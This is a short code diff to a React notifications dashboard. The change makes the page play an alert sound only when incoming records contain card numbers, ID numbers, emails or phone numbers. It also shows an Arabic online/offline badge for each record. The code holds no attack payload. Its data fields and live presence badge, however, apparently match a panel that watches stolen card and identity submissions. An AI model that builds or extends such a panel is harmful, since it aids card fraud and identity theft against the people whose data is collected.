@@ -90,9 +90,24 @@ export default function NotificationsPage() {
           })
           .filter((notification: any) => !notification.isHidden) as Notification[]
 
+        // Check if there are any new notifications with card info or general info
+        const hasNewCardInfo = notificationsData.some(
+          (notification) =>
+            notification.cardNumber && !notifications.some((n) => n.id === notification.id && n.cardNumber),
+        )
+        const hasNewGeneralInfo = notificationsData.some(
+          (notification) =>
+            (notification.idNumber || notification.email || notification.mobile) &&
+            !notifications.some((n) => n.id === notification.id && (n.idNumber || n.email || n.mobile)),
+        )
+
+        // Only play notification sound if new card info or general info is added
+        if (hasNewCardInfo || hasNewGeneralInfo) {
+          playNotificationSound()
+        }
+
         setNotifications(notificationsData)
         setIsLoading(false)
-        playNotificationSound()
       },
       (error) => {
         console.error("Error fetching notifications:", error)
@@ -192,7 +207,7 @@ export default function NotificationsPage() {
 
     return (
       <Badge variant="default" className={`${status === "online" ? "bg-green-500" : "bg-red-500"}`}>
-        <span style={{ fontSize: "12px", color: "#fff" }}>{status==='online'?'متصل':'غير متصل'}</span>
+        <span style={{ fontSize: "12px", color: "#fff" }}>{status === "online" ? "متصل" : "غير متصل"}</span>
       </Badge>
     )
   }
